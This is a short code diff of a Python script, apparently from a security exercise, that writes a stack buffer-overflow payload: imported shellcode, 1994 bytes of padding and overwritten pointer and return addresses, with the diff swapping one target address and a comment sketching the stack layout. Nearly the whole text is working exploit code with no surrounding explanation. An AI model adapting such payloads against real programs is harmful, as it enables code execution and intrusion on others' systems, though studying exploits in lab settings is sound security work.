@@ -4,7 +4,7 @@ import sys
 
 from shellcode import shellcode
 
-sys.stdout.buffer.write(shellcode + ((2048-54)*b'A') +(0x7ffffff6d520).to_bytes(8,"little") + (0x7ffffff6d4e8).to_bytes(8,"little"))
+sys.stdout.buffer.write(shellcode + ((2048-54)*b'A') +(0x7ffffff6d520).to_bytes(8,"little") + (0x0000000000401e2b).to_bytes(8,"little"))
 
 #sys.stdout.buffer.write(shellcode + ((0x810-54+8)*b'A')+(0x7ffffff6d520).to_bytes(8,"little"))
 # buf(2048) --> a(8) --> p(8) --> return addr but this return addr is not something we can overwrite
